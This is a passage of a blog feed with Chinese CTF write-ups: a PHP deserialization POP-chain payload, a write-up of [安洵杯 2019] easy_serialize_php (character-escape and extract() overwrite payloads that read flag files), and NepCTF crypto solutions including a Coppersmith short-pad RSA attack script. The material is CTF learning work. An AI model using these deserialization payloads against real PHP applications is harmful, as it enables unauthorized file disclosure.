class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D.%2Fflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A3%3A%22ftp%22%3B%7D</span><br></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>直接传就完事了. 传完拿到文件后base64解码一下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这个链子有够长的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;主要考察:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;反序列化魔术方法</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="unserialize" scheme="http://tearsjin.github.io/tags/unserialize/"/>
    
    <category term="魔术方法" scheme="http://tearsjin.github.io/tags/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    
    <category term="文件包含" scheme="http://tearsjin.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="伪协议" scheme="http://tearsjin.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>Noting of [安洵杯 2019]easy_serialize_php</title>
    <link href="http://tearsjin.github.io/2021/03/24/Noting-of-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/"/>
    <id>http://tearsjin.github.io/2021/03/24/Noting-of-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/</id>
    <published>2021-03-24T15:59:59.000Z</published>
    <updated>2021-03-25T01:34:38.155Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>又是一题字符逃逸, 不过还有其他要注意的点</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这题考察的点有:</p><ol><li>反序列化字符逃逸</li><li><code>extract()</code>变量覆盖</li></ol><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>提示说<code>phpinfo()</code>中有东西, 找了一下发现有<code>auto_append_file: d0g3_f1ag.php</code><br><code>auto_append_file</code>: 设置每个php中都自动require一个文件</p><p>中间有个<code>extract($_POST)</code>, 可能存在变量覆盖</p><p>在代码的最后, 存在<code>file_get_contents(base64_decode($userinfo[&#39;img&#39;])) </code>看参数是否可控, 可以看到有两行<br><code>$userinfo = unserialize($serialize_info) </code><br><code>$serialize_info = filter(serialize($_SESSION))</code></p><p>确认有序列化和反序列化, 而<code>$serialize_info</code>在序列化之后存在一个过滤使得字符减少 可能存在字符逃逸<br>来细细看一下<code>$_SESSION</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;user&quot;</span> =&gt; <span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line"><span class="string">&quot;function&quot;</span> =&gt; @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>],</span><br><span class="line"><span class="string">&quot;img&quot;</span> =&gt; sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以看到有两个参数是可以控制的, 但<code>&quot;img&quot;</code>会进行一次<code>sha1</code>加密, 反序列化后却不进行<code>sha1</code>解密, 所以无论输入什么基本都是无效的…</p><p>而<code>&quot;function&quot;</code>是可控, 且存在字符逃逸, 但如果要执行<code>file_get_contents()​</code>, 必须有<code>$function=&#39;show_image&#39;</code>, 在<code>$function</code>的值赋给<code>$_SESSION</code>之后, 存在一个<code>$extract($_POST)</code>, 我们可以利用这个修改<code>$function</code> 为show_image</p><p>到这里思路就清楚了:</p><p><code>file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code>参数可控 -&gt; 利用字符逃逸从<code>&quot;funtion&quot;</code>控制<code>&quot;img&quot;</code> -&gt; 利用 <code>extract()</code>变量覆盖修改<code>$function</code>为<code>show_image</code></p><h1 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h1><p>总结了挺多次了…</p><p>这次的<code>filter</code>是字符减少的替换, 需要利用数组来进行逃逸, 具体原理不多讲了, 可以看反序列化那篇笔记</p><h1 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a><code>extract()</code>变量覆盖</h1><p>这个还是第一次遇到,.</p><p><code>extract() </code>函数从数组中将变量导入到当前的符号表。</p><p>也就是说参数是个数组, 并且根据键对值来创造变量, 而且可以覆盖前面的变量, 这样就可以造成变量覆盖了</p><h1 id="payload-构造"><a href="#payload-构造" class="headerlink" title="payload 构造"></a>payload 构造</h1><blockquote><p>字符逃逸的构造也总结很多次了, 这次就简单的说一下</p></blockquote><p>这题主要就是构造字符逃逸的payload, 我们需要最后<code>&quot;img&quot; =&gt; base64encode(&quot;d0g3_f1ag.php&quot;)</code><br>老套路, 先构造一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="comment"># a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>再慢慢尝试通过字符减少把一个双引号闭合, 最后可以构造出payload: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f[]&#x3D;phpphpphpphp&amp;f[]&#x3D;&quot;;i:1;s:1:&quot;1&quot;;&#125;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;</span><br></pre></td></tr></table></figure><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p><code>GET</code>方式传<code>?f[]=phpphpphpphp&amp;f[]=&quot;;i:1;s:1:&quot;1&quot;;&#125;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=</code><br><code>POST</code>方式传<code>function=show_image</code></p><p>不过结果发现flag并不在<code>d0g3_f1ag.php</code>中,<code>d0g3_f1ag.php</code>中只有一句 <code>$flag = &#39;flag in /d0g3_fllllllag&#39;;</code><br>那就再构造一次</p><p><code>?f[]=phpphpphpphp&amp;f[]=&quot;;i:1;s:1:&quot;1&quot;;&#125;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn</code></p><p>别忘了<code>POST</code>, 然后就能看到flag了</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>做完题后翻了下别的师傅的wp, 发现别的师傅都是<code>GET</code>传<code>f=show_image</code>, <code>POST</code>直接对<code>$_SESSION[&#39;user&#39;]</code>和<code>$_SESSION[&#39;function&#39;]</code>做文章, 这样就不需要通过数组来进行字符逃逸了, 这也是一种思路, 而且可以控制的变量更多了(我脑子怎么就没转过来…</p><p>不过因为脑子没转过来也解锁了控制一个变量的时候, 利用数字来进行字符减少的字符逃逸!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;又是一题字符逃逸, 不过还有其他要注意的点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;这题考察的点有:&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="字符逃逸" scheme="http://tearsjin.github.io/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
    
    <category term="unserialize" scheme="http://tearsjin.github.io/tags/unserialize/"/>
    
    <category term="变量覆盖" scheme="http://tearsjin.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
  </entry>
  
  <entry>
    <title>writeup for 2021 NepCTF(To be continued</title>
    <link href="http://tearsjin.github.io/2021/03/24/writeup-for-2021-NepCTF/"/>
    <id>http://tearsjin.github.io/2021/03/24/writeup-for-2021-NepCTF/</id>
    <published>2021-03-24T07:59:39.000Z</published>
    <updated>2021-03-27T12:06:24.494Z</updated>
    
    <content type="html"><![CDATA[<p>太菜了太菜了太菜了, 虽然说跑出去玩了两天, 但还是花了半天时间做的, 一道Coppersmith’s short-pad attack没有想到调$\beta$, 做了半天都没出来, 属实拉了. 最后也就做了个改表的base64….算是除了签到就没出吧(还有道古典不想查了5555</p><h1 id="0x00-Real-Base"><a href="#0x00-Real-Base" class="headerlink" title="0x00 Real_Base"></a>0x00 Real_Base</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#py2</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,b_char</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    binstr=[ <span class="built_in">bin</span>(<span class="built_in">ord</span>(s[i])).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">    p1=<span class="built_in">len</span>(binstr) // <span class="number">3</span></span><br><span class="line">    p2=<span class="built_in">len</span>(binstr) % <span class="number">3</span></span><br><span class="line">    part1 = binstr[<span class="number">0</span>:<span class="number">3</span>*p1]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p1):</span><br><span class="line">        str_p1=binstr[i*<span class="number">3</span>]+binstr[i*<span class="number">3</span>+<span class="number">1</span>]+binstr[i*<span class="number">3</span>+<span class="number">2</span>]</span><br><span class="line">        tmp_str = [str_p1[x: x + <span class="number">6</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line">        tmp_res = [b_char[<span class="built_in">int</span>(x,<span class="number">2</span>)]<span class="keyword">for</span> x <span class="keyword">in</span> tmp_str]</span><br><span class="line">        res+=<span class="string">&#x27;&#x27;</span>.join(tmp_res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p2:</span><br><span class="line">        part2 = binstr[<span class="number">3</span>*p1:]</span><br><span class="line">        str_p2 = <span class="string">&#x27;&#x27;</span>.join(part2)+(<span class="number">3</span>-p2)*<span class="string">&#x27;0&#x27;</span>*<span class="number">8</span></span><br><span class="line">        tmp_str = [str_p2[x: x + <span class="number">6</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:p2+<span class="number">1</span>]</span><br><span class="line">        tmp_res = [b_char[<span class="built_in">int</span>(x,<span class="number">2</span>)]<span class="keyword">for</span> x <span class="keyword">in</span> tmp_str]</span><br><span class="line">        res+=<span class="string">&#x27;&#x27;</span>.join(tmp_res)</span><br><span class="line">        res +=<span class="string">&#x27;=&#x27;</span>*(<span class="number">3</span>-p2)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line">m1=random.sample(<span class="built_in">list</span>(b_char),<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(m1)</span><br><span class="line"><span class="built_in">print</span> encode(m1)</span><br><span class="line"><span class="built_in">print</span> encode(flag)</span><br><span class="line"><span class="comment"># rTcb1BR8YVW2EOUjweXpIiLt5QCNg7ZAsD9muq3ylMhvofnx/P</span></span><br><span class="line"><span class="comment"># 2Br9y9fcu97zvB2OruZv0D3Bwhbj0uNQnvfdtC2TwAfPrdBJ3xeP4wNn0hzLzCVUlRa=</span></span><br><span class="line"><span class="comment"># tCvM4R3TzvZ7nhjBxSiNyxmP28e7qCjVxQn91SRM3gBKzxQ=</span></span><br></pre></td></tr></table></figure><p>看了一下整个过程, 就是个base64, 但是表未知, 直接通过一对明文和密文回推表, 得出部分表基本上就能猜出整个表了, 直接用改过的表解码就行了.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><p> 当时做的时候的脚本不见了5555555</p></blockquote><h1 id="0x01-你们一天天的不写代码-难道是在等待爱情"><a href="#0x01-你们一天天的不写代码-难道是在等待爱情" class="headerlink" title="0x01 你们一天天的不写代码, 难道是在等待爱情"></a>0x01 你们一天天的不写代码, 难道是在等待爱情</h1><p>古典大混合, 什么银河字母, 古精灵…..不找了</p><h1 id="0x02-ChildRSA"><a href="#0x02-ChildRSA" class="headerlink" title="0x02  ChildRSA"></a>0x02  ChildRSA</h1><h2 id="problem-1"><a href="#problem-1" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#childrsa.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag1,flag2,padding1,padding2</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag1)==<span class="number">20</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag1)&gt;<span class="built_in">len</span>(flag2)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag2)==<span class="built_in">len</span>(padding2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init1</span>():</span></span><br><span class="line">    m=(padding1*<span class="number">2</span>**<span class="number">200</span>+bytes_to_long(flag1))*<span class="number">2</span>**<span class="number">200</span></span><br><span class="line">    r1=getPrime(<span class="number">170</span>)</span><br><span class="line">    r2=getPrime(<span class="number">170</span>)</span><br><span class="line">    p=getPrime(<span class="number">1024</span>)</span><br><span class="line">    q=getPrime(<span class="number">1024</span>)</span><br><span class="line">    N=p*q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> m,r1,r2,N</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc1</span>(<span class="params">m,r1,r2,N</span>):</span></span><br><span class="line">    c1=<span class="built_in">pow</span>(m+r1,<span class="number">3</span>,N)</span><br><span class="line">    c2=<span class="built_in">pow</span>(m+r2,<span class="number">3</span>,N)</span><br><span class="line">    <span class="keyword">return</span> c1,c2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init2</span>():</span></span><br><span class="line">    prefix = <span class="number">2</span>**<span class="number">1000</span></span><br><span class="line">    r3 = prefix+flag2*<span class="number">2</span>**<span class="number">200</span></span><br><span class="line">    r4 = <span class="number">2</span>*prefix+padding2*<span class="number">2</span>**<span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> r3,r4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc2</span>(<span class="params">r3,r4</span>):</span></span><br><span class="line">    c3 = <span class="built_in">pow</span>(r3*r4,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> c3</span><br><span class="line"></span><br><span class="line">(m,r1,r2,N) = init1()</span><br><span class="line">(c1,c2)=enc1(m,r1,r2,N)</span><br><span class="line">(r3,r4) = init2()</span><br><span class="line">c3 = enc2(r3,r4)</span><br><span class="line"><span class="built_in">print</span> N</span><br><span class="line">print(c1,c2,c3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output.txt</span></span><br><span class="line">N= ...</span><br><span class="line">(c1,c2,c3)= ...</span><br></pre></td></tr></table></figure><p>就是这道题做了半天都没出来, 当时试了好久的Coppersmith’s short-pad attack(后面简写为Csp atk, 连$\epsilon$都从0.01遍历到1了, 依旧没有出结果, 看了官方wp, WTF??? $\beta$调成1???, 为什么?</p><p>抱着这个问题我又重新翻了一下Sagemath文档, 找到了<code>small_roots()</code>的解释:</p><blockquote><p><strong>sage.rings.polynomial.polynomial_modn_dense_ntl.small_roots(<em>self</em>, <em>X=None</em>, <em>beta=1.0</em>, <em>epsilon=None</em>, <em>**kwds</em>)</strong></p><p>​        Let $N$ be the characteristic of the base ring this polynomial is defined over: <em><strong>N = self.base_ring().characteristic()</strong></em>. This method returns small roots of this polynomial modulo some factor $b$ of $N$ with the constraint that $b&gt;=N^β$. Small in this context means that if $x$ is a root of $f$ modulo $b$ then $|x|&lt;X$. This $X$ is either provided by the user or the maximum $X$ is chosen such that this algorithm terminates in polynomial time. If $X$ is chosen automatically it is $X=ceil(1/2N^{β^2/δ−ϵ})$. The algorithm may also return some roots which are larger than <em>X</em>. This algorithm in this context means Coppersmith’s algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander May’s PhD thesis referenced below.</p><p>INPUT:</p><ul><li><code>X</code> – an absolute bound for the root (default: see above)</li><li><code>beta</code> – compute a root mod $b$ where $b$ is a factor of <em>N</em> and $b ≥N^β.$ ( Default: 1.0, so $b=N$. )</li><li><code>epsilon</code> – the parameter $ϵ$ described above. (Default: $β/8$)</li><li><code>**kwds</code> – passed through to method <a href="https://doc.sagemath.org/html/en/reference/matrices/sage/matrix/matrix_integer_dense.html#sage.matrix.matrix_integer_dense.Matrix_integer_dense.LLL"><code>Matrix_integer_dense.LLL()</code></a>.</li></ul><p>REFERENCES:</p><p>Don Coppersmith. <em>Finding a small root of a univariate modular equation.</em> In Advances in Cryptology, EuroCrypt 1996, volume 1070 of Lecture Notes in Computer Science, p. 155–165. Springer, 1996. <a href="http://cr.yp.to/bib/2001/coppersmith.pdf">http://cr.yp.to/bib/2001/coppersmith.pdf</a></p><p>Alexander May. <em>New RSA Vulnerabilities Using Lattice Reduction Methods.</em> PhD thesis, University of Paderborn, 2003. <a href="http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf">http://www.cs.uni-paderborn.de/uploads/tx_sibibtex/bp.pdf</a></p></blockquote><p>文档里面给出了<code>small_roots()</code>使用的算法的paper, 有时间好好看一下.<br>这个函数需要注意的有三个参数<code>X,beta,epsilon</code>, 其中<code>beta</code>和<code>epsilon</code>也就是$\beta$和$ \epsilon$ .</p><p>来看看这三个参数都该怎么填</p><ul><li>$X$:  这个算是最好填的, 可以理解成<code>smallroot</code>的上界, 一般来说题目中给出了要解的小根的位数<code>kbits</code>就设置$X = 2^{kbits}$. 而在Csp atk中, 理论可解上界是$N.nbits \over e^2$ </li><li>$\beta$:   这个$\beta$可以理解成$N$的因子的下界, 对于常规RSA中的$N$, 一般就只有$1,N,p,q$四个因子, 我们可以选取$N,p,q$作为算法使用的因子, 所以其实$\beta$可以从0取到1, 因为都可能成立, 但真正用的时候一般取$[0.4,0.6] \cup {1}$.</li><li>$\epsilon$: 神奇的参数, 不填就是$\beta \over 8$, 文档中给出了一个关系式$X=ceil(1/2N^{β^2/δ−ϵ})$, 其实这个$ceil$可以暂时忽略掉, 所以就有$2X=N^{\beta^2/\delta-\epsilon}$, 文档里并没有给出$\delta$ 到底该如何取, 但从这题的官方wp中是给出了$\delta = e^2$, 其实就是多项式的次数. 所以对于Csp atk来说, $\epsilon = \beta^{2} / e^2 - x$, $x$的取法为$N^x = X.nbits $</li></ul><p>所以说,$\beta$填1也是阔以的! 因为factor里面是有$N$的!</p><p>按着上面的分析, 把从La佬那边拿来的Csp atk的板子稍微修改一下( 以后就用改进过的板子了嘿嘿嘿….</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n , kbits = <span class="number">0</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> kbits == <span class="number">0</span> :</span><br><span class="line">            kbits = n.nbits()//(e*e)</span><br><span class="line">        PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        g1 = x^e - c1</span><br><span class="line">        g2 = (x+y)^e - c2</span><br><span class="line">        q1 = g1.change_ring(PRZZ)</span><br><span class="line">        q2 = g2.change_ring(PRZZ)</span><br><span class="line">        h = q2.resultant(q1)</span><br><span class="line">        h = h.univariate_polynomial()</span><br><span class="line">        h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">        h = h.monic()</span><br><span class="line">        x = ceil(n.nbits() // kbits)</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> [<span class="number">0.4</span>,<span class="number">0.5</span>,<span class="number">0.6</span>,<span class="number">1</span>]:</span><br><span class="line">            eps = (b^<span class="number">2</span>) / (e^<span class="number">2</span>) - (<span class="number">1</span>/x)</span><br><span class="line">            print(eps)</span><br><span class="line">            <span class="keyword">if</span> eps &lt;= <span class="number">0</span>:</span><br><span class="line">                eps = b / <span class="number">8</span></span><br><span class="line">            print(<span class="string">&#x27;[+] try beta=&#123;&#125; epsilon=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">float</span>(b),<span class="built_in">float</span>(eps)))</span><br><span class="line">            diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=b,epsilon=eps)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(diff) &gt; <span class="number">0</span> :</span><br><span class="line">                print(<span class="string">&#x27;[+] find diff with beta=&#123;&#125; and epsilon=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(b,eps))</span><br><span class="line">                <span class="keyword">return</span> diff</span><br><span class="line">        </span><br><span class="line">        print(<span class="string">&#x27;[-] can not find the diff&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> diff</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line">n = ...</span><br><span class="line">(c1,c2,c3)= ...</span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">diff = short_pad_attack(c1,c2,e,n,kbits=<span class="number">170</span>)[<span class="number">0</span>]</span><br><span class="line">res = related_message_attack(c1,c2,diff,e,n)</span><br><span class="line">l2b(res)</span><br><span class="line"><span class="comment"># b&#x27;\xd4!I\x80M\xf0\x80\\\xd9&gt;\x19\xad\xdd^\x1d$\x99\xc1V\xc9/+\xdc\x97&quot;\xb3 \x03\xef3\xd1\xea\x04\xf4\x81z$\xd2]&#123;\xcb\xc4\x93\xe7\xf6\xb7\x9a\xb2\xe6a\x9fl\x99\xady\xa8\x9e\xa2\xf5\&#x27;\xa2\xfc\xe0Z\xa1\x1c\x15\rQ\x7fM\x99T\x93\x04\xc5\xdd\xdc\x80\xe4\x0f\x85)\x9f\xc3p\xdc\x03j.\x87kU\&#x27;Ud\x0bD&quot;)\x00\x00\x00\x00\x00Nep&#123;Nep_n3p_ba4_bad_\x00\x00\x00\x03\tx@Q2\x1b3\x1f\r\xb2\x95\x86?kE\x1f\xe6\xaay\xf1\xe5&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看到flag已经出来一部分了<code>Nep&#123;Nep_n3p_ba4_bad_</code></p><p>来看看怎么求<code>flag2</code>, 先把给的条件写出来, 我们记$flag_2 = f , padding = pd$<br>$$<br>r_3 = 2^{1000}+ 2^{200}f \\<br>r_4 = 2^{1001}+ 2^{200}pd \\<br>(r_3r_4)^3 = c_3<br>$$<br>官方wp上面说想考一下二元的Coopersmith, 先放着, 有空了学习一波. 这题还可以直接解一元二次方程直接出</p><h2 id="解方程解法"><a href="#解方程解法" class="headerlink" title="解方程解法"></a>解方程解法</h2><p>我们可以直接通过开三次方得出$r_3r_4 = R$<br>咱们先联立一下$r3,r4$的两个式子<br>$$<br>2^{2001} + 2^{1200}pd +2^{1201}f+ 2^{400} pd \cdot f = r_{34} \tag1<br>$$<br>这里要注意一下, $pd,f \le 2^{160}$, 也就是说$2^{400} pd \cdot f &lt; 